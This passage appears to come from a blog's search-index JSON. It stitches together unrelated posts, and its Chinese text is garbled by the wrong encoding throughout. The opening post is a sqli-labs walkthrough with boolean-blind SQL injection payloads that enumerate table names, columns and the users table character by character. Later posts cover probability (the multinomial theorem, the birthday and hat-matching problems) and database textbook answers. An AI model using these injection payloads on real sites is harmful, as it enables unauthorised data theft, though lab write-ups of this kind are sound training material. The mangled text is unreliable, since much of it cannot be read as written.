åˆ¤æ–­è¡¨çš„ä¸ªæ•° 1 2 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;4--+ //æ­£å¸¸æ˜¾ç¤º ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;3--+ //ä¸æ˜¾ç¤º é€ä¸€åˆ¤æ–­è¡¨åå­—ç¬¦é•¿åº¦ 1 ?id=1\u0026#39; and length((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1))=6--+ é€ä¸€åˆ¤æ–­è¡¨åå­—ç¬¦çš„ASCIIç  1 ?id=1\u0026#39; and ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1),1,1))\u0026gt;100--+ å­˜åœ¨emails,referers,uagents,users\nå¯¹columnæ‰§è¡Œç›¸åŒçš„æ“ä½œï¼Œwhereè¯­å¥ä¿®æ”¹ 1 where table_name = \u0026#39;users\u0026#39; //ä»¥åŠuagents,referers,emails.......ä¸€ä¸ªä¸€ä¸ªåˆ¤æ–­ï¼Œè™½ç„¶è¿™ä¸ªè¿‡ç¨‹çœŸçš„ååˆ†æ¼«é•¿ å¾—çŸ¥usersä¸­æœ‰ä¸‰ä¸ªå­—æ®µid,username,password\nåˆ¤æ–­å­—æ®µé•¿åº¦ 1 ?id=1\u0026#39; and length((select id from users limit 3,1))=1--+ åˆ¤æ–­å­—æ®µASCIIå€¼ 1 ?id=1\u0026#39; and ascii(substr((select id from users limit 3,1)),1,1)\u0026gt;100--+ ","date":"2025-01-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sqli-labs%E9%80%9A%E5%85%B3/","title":"sqli-labsé€šå…³"},{"content":"è®°å·\n$$\\binom n{n_1,n_2,\\cdots,n_r}=\\frac{n!}{n_1!n_2!\\cdots n_r!}$$å› æ­¤ï¼Œ$\\binom n{n_1,n_2,\\ldots,n_r}$è¡¨ç¤ºæŠŠ $n$ ä¸ª ä¸ åŒ çš„ å…ƒ ç´  åˆ† æˆ å¤§ å° åˆ† åˆ« ä¸º $n_1, n_2, \\ldots , n_r$çš„$r$ä¸ª\nä¸åŒç»„çš„ç»„åˆæ•°. ä¾‹ 5e å‡è®¾æœ‰$n+m$ä¸ªçƒï¼Œå…¶ä¸­$n$ä¸ªçº¢çš„ï¼Œ$m$ä¸ªè“çš„ï¼Œå°†å®ƒä»¬éšæœºæ’æˆä¸€æ’ï¼Œå³æ‰€$(n+m)!$ç§æ’åˆ—éƒ½æ˜¯ç­‰å¯èƒ½çš„. å¦‚æœåªè®°å½•è¿ç»­æ’åˆ—çš„çƒçš„é¢œè‰²ï¼Œè¯æ˜å„ç§å¯èƒ½çš„ç»“æœæ¦‚ç‡æ˜¯ä¸€æ ·çš„. è§£ æˆ‘ä»¬å°†$(n+m$)ä¸ªçƒçš„æ¬¡åºæ’åˆ—ç§°ä¸ºä¸€ç»„çƒçš„æ’åˆ—ï¼Œå°† $n+m$ ä¸ªçƒçš„é¢œè‰²æ¬¡åºæ’ç§°ä¸ºä¸€ç»„çƒçš„é¢œè‰²æ¬¡åºæ’åˆ—. çƒçš„æ’åˆ—å…±æœ‰($n+m$)!ç§ï¼Œåœ¨çº¢çƒä¹‹é—´ä½œä»»ä½•ä¸€ä¸ªä½äºæ¢ï¼Œåœ¨è“çƒä¹‹é—´ä½œä»»ä½•ä¸€ä¸ªä½ç½®ç½®æ¢ï¼Œç½®æ¢çš„ç»“æœå¹¶ä¸å½±å“çƒçš„é¢œè‰²æ¬¡åºæ’åˆ—. ä»è€Œç»„çƒçš„é¢œè‰²æ¬¡åºæ’åˆ—ï¼Œå¯¹åº”äº$n!m!$ä¸ªçƒçš„æ’åˆ—ï¼Œè¿™è¯´æ˜çƒçš„æ¬¡åºæ’åˆ—ä¹Ÿæ˜¯ç­‰å¯èƒ½çš„ä¸”æ¯ä¸€ç§é¢œè‰²æ¬¡åºå‡ºç°çš„æ¦‚ç‡ä¸º$n!m!/(n+m)!.$\nå¤šé¡¹å¼å®šç†\n$$(x_{1}+x_{2}+\\cdots+x_{r})^{n}=\\sum_{\\begin{array}{c}(n_{1},\\cdots,n_{r}):\\\\n_{1}+\\cdots+n_{r}=n\\end{array}}\\binom{n}{n_{1},n_{2},\\cdots,n_{r}}x_{1}^{n_{1}}x_{2}^{n_{2}}\\cdots x_{r}^{n_{r}}$$ä¸Šå¼çš„æ±‚å’Œå·æ˜¯å¯¹æ»¡è¶³ $n_1+n_2+\\cdotp\\cdotp\\cdotp\\cdotp+n_r=n$ çš„æ‰€æœ‰éè´Ÿæ•´æ•°å‘é‡($n_1,n_2,\\cdotp\\cdotp\\cdotp,n_r)$æ±‚å’Œ.\nå‘½é¢˜ 6.1 å…±æœ‰$\\binom{n-1}{r-1}$ä¸ªä¸åŒçš„æ­£æ•´æ•°å‘é‡$(x_1,x_2,\\cdots,x_r)$æ»¡è¶³ ä¸ºäº†å¾—åˆ°éè´Ÿæ•´æ•°è§£(è€Œä¸æ˜¯æ­£æ•´æ•°è§£)çš„ä¸ªæ•°ï¼Œæ³¨æ„ï¼Œ$x_1+x_2+\\cdots+x_r=n$çš„éè´Ÿæ•´æ•°è§£ä¸ªæ•°ä¸$y_1+y_2+\\cdotp\\cdotp\\cdotp+y_r=n+r$çš„æ­£æ•´æ•°è§£ä¸ªæ•°æ˜¯ç›¸åŒçš„(ä»¤$y_i= x_i+ 1$, $i= 1$, $\\cdots$, $r) .$ å› æ­¤ï¼Œåˆ©ç”¨å‘½é¢˜ 6.1,å¯å¾—åˆ°å¦‚ä¸‹å‘½é¢˜ã€‚\nç”Ÿæ—¥é—®é¢˜ å¦‚æœæˆ¿é—´é‡Œæœ‰$n$ä¸ªäººï¼Œé‚£ä¹ˆæ²¡æœ‰ä¸¤äººçš„ç”Ÿæ—¥æ˜¯åŒä¸€å¤©çš„æ¦‚ç‡æ˜¯å¤šå¤§ï¼Ÿå½“$n$å¤šå¤§ æ—¶ï¼Œæ‰èƒ½ä¿è¯æ­¤æ¦‚ç‡å°äº1/2? è§£ æ¯ä¸ªäººçš„ç”Ÿæ—¥éƒ½æœ‰ 365 ç§å¯èƒ½ï¼Œæ‰€ä»¥$n$ä¸ªäººä¸€å…±æ˜¯ 365\u0026quot; ç§å¯èƒ½(æ­¤å¤„å¿½ç•¥æœ‰äººç”Ÿæ—¥æ˜¯ 2æœˆ 29 æ—¥çš„å¯èƒ½æ€§). å‡å®šæ¯ç§ç»“æœçš„å¯èƒ½æ€§éƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆæ‰€æ±‚äº‹ä»¶çš„æ¦‚ç‡ä¸º$365\\times364\\times363\\times\\cdots\\times(365-n+1)/365^n.$ä»¤äººæƒŠå¥‡çš„æ˜¯ï¼Œä¸€æ—¦$n\\geqslant23$,è¿™ä¸ªæ¦‚ç‡å°±æ¯”1/2è¦å°. å³æˆ¿é—´é‡Œäººæ•°å¦‚æœè¶…è¿‡ 23 çš„è¯ï¼Œé‚£ä¹ˆè‡³å°‘æœ‰ä¸¤äººä¸ºåŒä¸€å¤©ç”Ÿæ—¥çš„æ¦‚ç‡å°±å¤§äº 1/2. å¾ˆå¤šäººä¸€å¼€å§‹å¯¹è¿™ä¸ªç»“æœå¾ˆåƒæƒŠï¼Œå› ä¸º 23 ç›¸å¯¹äºä¸€å¹´ 365 å¤©æ¥è¯´å¤ªå°äº†.ç„¶è€Œï¼Œå¯¹æ¯ä¸¤ä¸ªäººæ¥è¯´ï¼Œç”Ÿæ—¥ç›¸åŒçš„æ¦‚ç‡ä¸º$\\frac{365\\cdot\\tilde{}}{(365)^2}=\\frac1{365}$,23ä¸ªäººä¸€å…±å¯ä»¥ç»„æˆ$\\binom{23}2=253$ å¯¹ï¼Œè¿™æ ·æ¥çœ‹ä¸Šè¿°ç»“æœä¼¼ä¹å°±ä¸å†ä»¤äººåƒæƒŠäº†.\né…å¯¹é—®é¢˜ å‡è®¾æœ‰ N ä½ç”·å£«å‚åŠ èˆä¼šï¼Œæ‰€æœ‰äººéƒ½å°†å¸½å­æ‰”åˆ°æˆ¿é—´ä¸­å¤®æ··åœ¨ä¸€ èµ·ï¼Œç„¶åæ¯äººå†éšæœºæ‹¿ä¸€é¡¶å¸½å­.æ‰€æœ‰äººéƒ½æ²¡æœ‰æ‹¿åˆ°è‡ªå·±å¸½å­çš„æ¦‚ç‡æ˜¯å¤šå°‘ï¼Ÿ è§£ å…ˆè®¡ç®—è‡³å°‘æœ‰ä¸€äººæ‹¿åˆ°è‡ªå·±çš„å¸½å­çš„æ¦‚ç‡.ä»¤$E_i(i=1,2,\u0026hellip;,N)$è¡¨ç¤ºäº‹ä»¶â€œç¬¬$i$ äººæ‹¿åˆ°äº†è‡ªå·±çš„å¸½å­â€.è¿™æ ·ï¼Œç”±å‘½é¢˜ 4.4,è‡³å°‘æœ‰ä¸€äººæ‹¿åˆ°äº†è‡ªå·±çš„å¸½å­çš„æ¦‚ç‡ä¸ºï¼š\n$$P\\Big(\\bigcup_{i=1}^{N}E_{i}\\Big)\\:=\\sum_{i=1}^{N}P(E_{i})-\\sum_{i_{1}","date":"2024-12-27T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%A6%82%E7%8E%87%E8%AE%BA%E6%A8%A1%E5%9E%8B%E5%8F%8A%E5%B0%8F%E7%BB%93/","title":"æ¦‚ç‡è®ºæ¨¡å‹åŠå°ç»“"},{"content":"ç¬¬äºŒç«  å…³ç³»æ•°æ®åº“ 1.è¯•è¿°å…³ç³»æ¨¡å‹çš„ä¸‰ä¸ªç»„æˆéƒ¨åˆ†\nå…³ç³»æ•°æ®ç»“æ„ï¼šåªåŒ…å«å•ä¸€çš„æ•°æ®ç»“æ„â€”â€”å…³ç³»ï¼Œç”±ä¸‰ç§ç±»å‹ï¼šåŸºæœ¬å…³ç³»ï¼ˆåŸºæœ¬è¡¨ï¼‰ï¼ŒæŸ¥è¯¢è¡¨å’Œè§†å›¾è¡¨\nå…³ç³»æ“ä½œé›†åˆï¼šæŸ¥è¯¢ï¼ˆé€‰æ‹©ï¼ŒæŠ•å½±ï¼Œå¹¶ï¼Œå·®ï¼Œç¬›å¡å°”ç§¯ï¼‰ï¼Œæ’å…¥ï¼Œåˆ é™¤ï¼Œä¿®æ”¹\nå…³ç³»å®Œæ•´æ€§çº¦æŸ\n2.å…³ç³»æ•°æ®è¯­è¨€çš„ç‰¹ç‚¹å’Œåˆ†ç±»\n(1)å…³ç³»ä»£æ•°è¯­è¨€ (2)å…³ç³»æ¼”ç®—è¯­è¨€ï¼šå…ƒç»„å…³ç³»æ¼”ç®—è¯­è¨€å’ŒåŸŸå…³ç³»æ¼”ç®—è¯­è¨€ (3)SQLï¼šå…·æœ‰å…³ç³»ä»£æ•°å’Œå…³ç³»æ¼”ç®—åŒé‡ç‰¹ç‚¹çš„è¯­è¨€\n3.è§£é‡Šæœ¯è¯­ï¼Œè¯´æ˜å…³ç³»ä¸è”ç³»\nï¼ˆ1ï¼‰åŸŸï¼šä¸€ç»„å…·æœ‰ç›¸åŒæ•°æ®ç±»å‹çš„å€¼çš„é›†åˆ\nï¼ˆ2ï¼‰ç¬›å¡å°”ç§¯ï¼šç»™å®šä¸€ç»„åŸŸD1,D2,\u0026hellip;,Dn,D1Ã—D2Ã—\u0026hellip;Ã—Dn={(d1,d2,\u0026hellip;,dn),diâˆˆDi}\nï¼ˆ3ï¼‰å…³ç³»ï¼šD1Ã—D2Ã—\u0026hellip;Ã—Dnï¼ˆç¬›å¡å°”ç§¯ï¼‰çš„æœ‰é™å­é›†ï¼Œè¡¨ç¤ºä¸ºRï¼ˆD1,D2,D3,\u0026hellip;,Dnï¼‰ï¼Œn=1ï¼Œä¸€å…ƒå…³ç³»ï¼Œn=2ï¼ŒäºŒå…ƒå…³ç³»ï¼Œä¹Ÿæ˜¯ä¸€å¼ äºŒç»´è¡¨\nï¼ˆ4ï¼‰å…ƒç»„ï¼šç¬›å¡å°”ç§¯ä¸­æ¯ä¸€ä¸ªå…ƒç´ {(d1,d2,\u0026hellip;,dn),diâˆˆDi}ï¼Œä¸€ä¸ªnå…ƒç»„\nï¼ˆ5ï¼‰å±æ€§ï¼šåœ¨äºŒç»´è¡¨ä¸­ï¼Œæ˜¯ä¸€åˆ—ï¼Œnç›®å…³ç³»æœ‰nä¸ªå±æ€§ï¼ˆåˆ—ï¼‰\nï¼ˆ1ï¼‰ä¸»ç ï¼šä»å¤šä¸ªå€™é€‰ç ä¸­é€‰å®šä¸€ä¸ªä½œä¸ºä¸»ç \nï¼ˆ2ï¼‰å€™é€‰ç ï¼šæŸä¸€å±æ€§ç»„çš„å€¼é¢èƒ½å”¯ä¸€çš„æ ‡è¯†ä¸€ä¸ªå…ƒç»„ï¼Œè€Œå…¶å­é›†ä¸èƒ½\nï¼ˆ3ï¼‰å¤–ç ï¼šå…³ç³»Rä¸­çš„ä¸€ä¸ªå±æ€§Få¹¶ä¸æ˜¯Rçš„ç ï¼Œä½†å¯¹åº”å¦ä¸€ä¸ªå…³ç³»Sä¸­çš„ä¸»ç Ksï¼ŒFç§°ä¸ºRå’ŒSçš„å¤–ç ï¼Œå®šä¹‰åœ¨åŒä¸€ä¸ªåŸŸä¸Š\nï¼ˆ1ï¼‰å…³ç³»æ¨¡å¼ï¼ˆå‹ï¼‰ï¼šå…³ç³»çš„æè¿°ï¼ŒRï¼ˆU,D,DOM,F)ï¼ŒRä¸ºå…³ç³»åï¼ŒUä¸ºå±æ€§åé›†åˆï¼ŒDä¸ºå±æ€§æ¥è‡ªçš„åŸŸï¼ŒDOMä¸ºå±æ€§å‘åŸŸçš„æ˜ åƒé›†åˆï¼ˆå¦‚å±æ€§çš„ç±»å‹ï¼Œé•¿åº¦\nï¼ˆ2ï¼‰å…³ç³»ï¼ˆå€¼ï¼‰ï¼šåŒ…æ‹¬åŸºæœ¬å…³ç³»ï¼ˆåŸºæœ¬è¡¨ï¼‰ï¼ŒæŸ¥è¯¢è¡¨ï¼Œè§†å›¾è¡¨\nï¼ˆ3ï¼‰å…³ç³»æ•°æ®åº“ï¼šæ‰€æœ‰å…³ç³»çš„é›†åˆ\n4.ä¸¾ä¾‹è¯´æ˜å…³ç³»æ¨¡å¼å’Œå…³ç³»çš„è”ç³»\nå…³ç³»æ˜¯å…³ç³»æ¨¡å‹åœ¨æŸä¸€æ—¶åˆ»çš„çŠ¶æ€æˆ–å†…å®¹ï¼Œå…³ç³»æ¨¡å¼æ˜¯é™æ€çš„ï¼Œç¨³å®šçš„ï¼Œå…³ç³»æ˜¯åŠ¨æ€çš„ï¼Œéšæ—¶é—´ä¸æ–­å˜åŒ–çš„ã€‚\n5.è¯•è¿°å…³ç³»æ¨¡å‹çš„å®Œæ•´æ€§è§„åˆ™ã€‚åœ¨å‚ç…§å®Œæ•´æ€§ä¸­ï¼Œè¯´æ˜æƒ…å†µä¸‹å¤–ç å±æ€§çš„å€¼å¯ä»¥ä¸ºç©ºå€¼\nå®ä½“å®Œæ•´æ€§ï¼šä¸»å±æ€§ä¸èƒ½å»ç©ºå€¼ï¼ˆnullï¼‰\nå‚ç…§å®Œæ•´æ€§ï¼šä¸¤ä¸ªå…³ç³»ä¹‹é—´å­˜åœ¨ç€å±æ€§çš„å¼•ç”¨ï¼Œå¦‚å­¦ç”Ÿçš„å­¦å·å–å€¼éœ€è¦å‚ç…§ä¸“ä¸šå…³ç³»ä¸­çš„ä¸“ä¸šå·\nç”¨æˆ·å®šä¹‰çš„å®Œæ•´æ€§ï¼šåº”ç”¨é¢†åŸŸéœ€è¦éµå¾ªçš„çº¦æŸæ¡ä»¶ï¼Œè¯­ä¹‰çº¦æŸ\nåœ¨å‚ç…§å®Œæ•´æ€§è§„åˆ™ä¸­ï¼Œå¤–ç å±æ€§çš„å€¼å¯ä»¥å–ç©ºå€¼åªæœ‰å½“å¤–ç çš„æ¯ä¸ªå±æ€§å€¼å–ç©ºå€¼ï¼ˆäºŒç»´è¡¨ä¸­æ¯ä¸€åˆ—éƒ½æ˜¯NULLï¼‰\n6.è¯•è¿°ç­‰å€¼è¿æ¥ä¸è‡ªç„¶è¿æ¥çš„åŒºåˆ«å’Œè”ç³»\nè‡ªç„¶è¿æ¥æ˜¯ä¸€ç§ç‰¹æ®Šçš„ç­‰å€¼è¿æ¥ï¼Œï¼Œè‡ªç„¶è¿æ¥å–æ¶ˆé‡å¤åˆ—\n7.å…³ç³»ä»£æ•°çš„åŸºæœ¬è¿ç®—\nä¼ ç»Ÿçš„é›†åˆè¿ç®—ï¼šäºŒç›®è¿ç®—ï¼ŒåŒ…æ‹¬å¹¶ï¼Œå·®ï¼Œäº¤ï¼Œç¬›å¡å°”ç§¯\nä¸“é—¨çš„å…³ç³»è¿ç®—ï¼šé€‰æ‹©ï¼ŒæŠ•å½±ï¼Œè¿æ¥ï¼ˆæŸ¥è¯¢å°±æ˜¯ä¸€ä¸ªå…³ç³»åœ¨å±æ€§ä¸Šçš„æŠ•å½±ï¼Œå–æ¶ˆæŸäº›åˆ—å’Œé‡å¤å…ƒç»„ï¼‰ï¼Œé™¤è¿ç®—\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"æ•°æ®åº“ç³»ç»Ÿæ¦‚è®ºç¬¬äºŒç« ä¹ é¢˜ç­”æ¡ˆ"},{"content":"ç¬¬ä¸€ç«  ç»ªè®º 1.è¯•è¿°æ•°æ®ï¼Œæ•°æ®åº“ï¼Œæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œæ•°æ®åº“ç³»ç»Ÿçš„æ¦‚å¿µ\næ•°æ®ï¼šæè¿°äº‹ç‰©çš„ç¬¦å· æ•°æ®åº“DBï¼šé•¿æœŸå‚¨å­˜åœ¨è®¡ç®—æœºå†…ï¼Œæœ‰ç»„ç»‡çš„ï¼Œå¯å…±äº«çš„å¤§é‡æ•°æ®çš„é›†åˆã€‚æ•°æ®åº“ä¸­çš„æ•°æ®æŒ‰ä¸€å®šçš„æ•°æ®æ¨¡å‹ç»„ç»‡ï¼Œæè¿°å’Œå‚¨å­˜ï¼Œå…·æœ‰è¾ƒå°çš„å†—ä½™åº¦ï¼Œè¾ƒé«˜çš„æ•°æ®ç‹¬ç«‹æ€§å’Œæ˜“æ‰©å±•æ€§ï¼Œå¹¶å¯ä¸ºå„ç§ç”¨æˆ·å…±äº« æ•°æ®åº“ç®¡ç†ç³»ç»ŸDBMSï¼šç³»ç»Ÿè½¯ä»¶ï¼Œæœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š æ•°æ®å®šä¹‰ æ•°æ®ç»„ç»‡ï¼Œå­˜å‚¨å’Œç®¡ç† æ•°æ®æ“çºµåŠŸèƒ½ æ•°æ®åº“çš„äº‹åŠ¡ç®¡ç†å’Œè¿è¡Œç®¡ç† æ•°æ®åº“å»ºç«‹å’Œç»´æŠ¤ æ•°æ®åº“ç³»ç»ŸDBSï¼šç”±DBï¼ŒDBMS,DAç»„æˆçš„å­˜å‚¨ï¼Œç®¡ç†ï¼Œå¤„ç†å’Œç»´æŠ¤æ•°æ®çš„ç³»ç»Ÿ 2.ä½¿ç”¨æ•°æ®åº“æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ\næ•°æ®ç»“æ„åŒ–ï¼šæ•´ä½“å’Œå†…éƒ¨\næ•°æ®çš„å…±äº«æ€§é«˜ï¼Œå†—ä½™åº¦ä½ä¸”æ˜“æ‰©å±•ï¼šå¤§å¤§å‡å°‘æ•°æ®å†—ä½™ï¼ŒèŠ‚çº¦å­˜å‚¨ç©ºé—´ï¼Œé¿å…æ•°æ®ä¹‹é—´çš„ä¸ç›¸å®¹æ€§ä¸ä¸ä¸€è‡´æ€§\næ•°æ®ç‹¬ç«‹æ€§é«˜ï¼š\nç‰©ç†ç‹¬ç«‹æ€§ï¼Œç”¨æˆ·çš„åº”ç”¨ç¨‹åºä¸æ•°æ®åº“ä¸­æ•°æ®åº“æ•°æ®çš„ç‰©ç†å­˜å‚¨ç›¸äº’ç‹¬ç«‹ é€»è¾‘ç‹¬ç«‹æ€§ï¼šç”¨æˆ·çš„åº”ç”¨ç¨‹åºä¸æ•°æ®åº“çš„é€»è¾‘ç»“æ„æ˜¯ç›¸äº’ç‹¬ç«‹ æ•°æ®ç”±æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç»Ÿä¸€ç®¡ç†å’Œæ§åˆ¶\næ•°æ®çš„å®‰å…¨æ€§ä¿æŠ¤ï¼šä¿æŠ¤æ•°æ®ä»¥é˜²æ­¢ä¸åˆæ³•ä½¿ç”¨é€ æˆçš„æ•°æ®æ³„å¯†å’Œç ´å æ•°æ®çš„å®Œæ•´æ€§æ£€æŸ¥ï¼šæ•°æ®çš„æ­£ç¡®æ€§ï¼Œæœ‰æ•ˆæ€§å’Œç›¸å®¹æ€§ ç”¨æˆ·å¯ä»¥å¹¶å‘æ§åˆ¶ æ•°æ®åº“æ¢å¤åŠŸèƒ½ï¼šæ¯”å¦‚è¯´rollback 3.è¯•è¿°æ–‡ä»¶ç³»ç»Ÿä¸æ•°æ®åº“ç³»ç»Ÿçš„åŒºåˆ«å’Œè”ç³»\nè§P7è¡¨1.1\n6.æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¸»è¦åŠŸèƒ½\nåœ¨æ•°æ®åº“å»ºç«‹ï¼Œè¿ç”¨å’Œç»´æŠ¤æ—¶å¯¹æ•°æ®åº“è¿›è¡Œç»Ÿä¸€æ§åˆ¶ï¼Œä»¥ä¿è¯æ•°æ®çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ï¼Œå¹¶åœ¨å¤šç”¨æˆ·åŒæ—¶ä½¿ç”¨æ•°æ®åº“æ—¶è¿›è¡Œå¹¶å‘æ§åˆ¶ï¼Œåœ¨å‘ç”Ÿæ•…éšœåå¯¹æ•°æ®åº“è¿›è¡Œæ¢å¤\n7.ä»€ä¹ˆæ˜¯æ¦‚å¿µæ¨¡å‹ï¼Ÿè¯•è¿°æ¦‚å¿µæ¨¡å‹çš„ä½œç”¨\nä¿¡æ¯æ¨¡å‹ï¼ŒæŒ‰ç”¨æˆ·çš„è§‚ç‚¹å¯¹æ•°æ®å’Œä¿¡æ¯å»ºæ¨¡ï¼Œä¸»è¦ç”¨äºæ•°æ®åº“è®¾è®¡ï¼Œç”¨äºä¿¡æ¯ä¸–ç•Œçš„å»ºæ¨¡\n8.å®šä¹‰å¹¶è§£é‡Šæ¦‚å¿µæ¨¡å‹ä¸­ä»¥ä¸‹æœ¯è¯­ï¼š\nå®ä½“ï¼šå®¢è§‚å­˜åœ¨å¹¶å¯ç›¸äº’åŒºåˆ«çš„äº‹ç‰©ã€‚å¦‚å…·ä½“çš„äººï¼Œäº‹ï¼Œç‰©ï¼ŒæŠ½è±¡çš„æ¦‚å¿µæˆ–è”ç³»\nå®ä½“å‹ï¼šç”¨å®ä½“ååŠå…¶å±æ€§åé›†åˆæ¥æŠ½è±¡å’Œåˆ»ç”»åŒç±»å®ä½“ï¼Œå¦‚å­¦ç”Ÿï¼ˆå­¦ç”Ÿå·ï¼Œå§“åï¼Œæ€§åˆ«ï¼Œæ‰€åœ¨é™¢ç³»\u0026hellip;)\nå®ä½“é›†ï¼šåŒä¸€ç±»å‹å®ä½“çš„é›†åˆã€‚ä¾‹å¦‚ï¼Œå…¨ä½“å­¦ç”Ÿå°±æ˜¯ä¸€ä¸ªå®ä½“é›†\nå®ä½“ä¹‹é—´çš„è”ç³»ï¼šæˆ–ç§°ä¸åŒå®ä½“é›†ä¹‹é—´çš„è”ç³»\n9.è¯•è¿°æ•°æ®æ¨¡å‹çš„æ¦‚å¿µï¼Œæ•°æ®æ¨¡å‹çš„ä½œç”¨å’Œæ•°æ®æ¨¡å‹çš„ä¸‰ä¸ªè¦ç´ \nå¯¹ç°å®ä¸–ç•Œæ•°æ®ç‰¹å¾çš„æŠ½è±¡ï¼Œç”¨æ¥æè¿°æ•°æ®ï¼Œç»„ç»‡æ•°æ®å’Œå¯¹æ•°æ®è¿›è¡Œæ“ä½œ\næ¯”è¾ƒçœŸå®åœ°æ¨¡æ‹Ÿç°å®ä¸–ç•Œ å®¹æ˜“ä¸ºäººæ‰€ç†è§£ ä¾¿äºåœ¨è®¡ç®—æœºä¸Šå®ç° 10.è¯•è¿°å±‚æ¬¡æ¨¡å‹çš„æ¦‚å¿µï¼Œä¸¾å‡ºä¸‰ä¸ªå®ä¾‹\næœ‰ä¸”åªæœ‰ä¸€ä¸ªç»“ç‚¹æ²¡æœ‰åŒäº²ç»“ç‚¹ï¼ˆæ ¹èŠ‚ç‚¹ï¼‰ï¼Œæ ¹ä»¥å¤–çš„å…¶ä»–ç»“ç‚¹æœ‰ä¸”åªæœ‰åŒäº²ç»“ç‚¹ï¼Œå®ä¾‹ï¼šè¡Œæ”¿ç»“æ„ï¼Œå®¶æ—å…³ç³»ï¼Œç”Ÿç‰©åˆ†ç±»å­¦ï¼Œç”µè„‘æ–‡ä»¶ç³»ç»Ÿ\n11.è¯•è¿°ç½‘çŠ¶æ¨¡å‹çš„æ¦‚å¿µï¼Œä¸¾å‡ºä¸‰ä¸ªå®ä¾‹\nå…è®¸ä¸€ä¸ªä»¥ä¸Šçš„ç»“ç‚¹æ— åŒäº²ï¼Œä¸€ä¸ªç»“ç‚¹å¯ä»¥æœ‰å¤šäºä¸€ä¸ªçš„åŒäº²ï¼Œå¦‚äº’è”ç½‘ï¼Œç¤¾äº¤ç½‘ç»œï¼Œåœ°é“äº¤é€šç½‘ç»œ\n12.è¯•è¿°å±‚æ¬¡ï¼Œç½‘çŠ¶æ¨¡å‹çš„ä¼˜ç¼ºç‚¹\nå±‚æ¬¡æ¨¡å‹çš„ä¼˜ç‚¹ï¼š\næ•°æ®ç»“æ„ç®€å•æ¸…æ™° æ•°æ®åº“çš„æŸ¥è¯¢æ•ˆç‡é«˜ å±‚æ¬¡æ•°æ®æ¨¡å‹æä¾›äº†è‰¯å¥½çš„å®Œæ•´æ€§æ”¯æŒ å±‚æ¬¡æ¨¡å‹çš„ç¼ºç‚¹ï¼š\nç°å®ä¸–ç•Œä¸­å¾ˆå¤šè”ç³»æ˜¯éå±‚æ¬¡æ€§çš„ å¦‚æœä¸€ä¸ªç»“ç‚¹å…·æœ‰å¤šä¸ªåŒäº²ç»“ç‚¹ç­‰ï¼Œä¸ä¾¿äºç”¨å±‚æ¬¡æ¨¡å‹è¡¨ç¤ºè”ç³» æŸ¥è¯¢å­å¥³ç»“ç‚¹å¿…é¡»é€šè¿‡åŒäº²ç»“ç‚¹ ç”±äºç»“æ„ä¸¥å¯†ï¼Œå±‚æ¬¡å‘½ä»¤è¶‹äºç¨‹åºåŒ– ç½‘çŠ¶æ¨¡å‹çš„ä¼˜ç‚¹ï¼š\nèƒ½å¤Ÿæ›´ä¸ºç›´æ¥åœ°æè¿°ç°å®ä¸–ç•Œï¼Œå¦‚ä¸€ä¸ªç»“ç‚¹å¯ä»¥æœ‰å¤šä¸ªåŒäº²ï¼Œç»“ç‚¹ä¹‹é—´å¯ä»¥æœ‰å¤šç§è”ç³» å…·æœ‰è‰¯å¥½åœ°æ€§èƒ½ï¼Œå­˜å–æ•ˆç‡è¾ƒé«˜ ç½‘çŠ¶æ¨¡å‹çš„ç¼ºç‚¹ï¼š\nç»“æ„è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ ç½‘çŠ¶æ¨¡å‹çš„DDL,DMLå¤æ‚ï¼Œéœ€è¦åµŒå…¥è¯­è¨€ è®°å½•ä¹‹é—´çš„è”ç³»é€šè¿‡å­˜å–è·¯å¾„å®ç°ï¼Œåº”ç”¨ç¨‹åºåœ¨è®¿é—®æ•°æ®æ—¶å€™å¿…é¡»é€‰æ‹©é€‚å½“çš„å­˜å–è·¯å¾„ï¼Œç”¨æˆ·å¿…é¡»äº†è§£ç³»ç»Ÿç»“æ„çš„ç»†èŠ‚ï¼ŒåŠ é‡äº†åº”ç”¨ç¨‹åºçš„è´Ÿæ‹… 13.è¯•è¿°å…³ç³»æ¨¡å‹çš„æ¦‚å¿µï¼Œå®šä¹‰å¹¶è§£é‡Šä»¥ä¸‹æœ¯è¯­\nå…³ç³»æ¨¡å‹ç”±ä¸€ç»„å…³ç³»ç»„æˆï¼Œæ¯ä¸ªå…³ç³»çš„æ•°æ®ç»“æ„éƒ½æ˜¯ä¸€å¼ è§„èŒƒåŒ–çš„äºŒç»´è¡¨ã€‚\nå…ƒç»„ï¼šè¡¨ä¸­çš„ä¸€è¡Œå³ä¸ºä¸€ä¸ªå…ƒç»„\nå±æ€§ï¼šè¡¨ä¸­çš„ä¸€åˆ—å³ä¸ºä¸€ä¸ªå±æ€§\nå…³ç³»ï¼šä¸€ä¸ªå…³ç³»å¯¹åº”ä»¥ä¸€å¼ è¡¨\nç 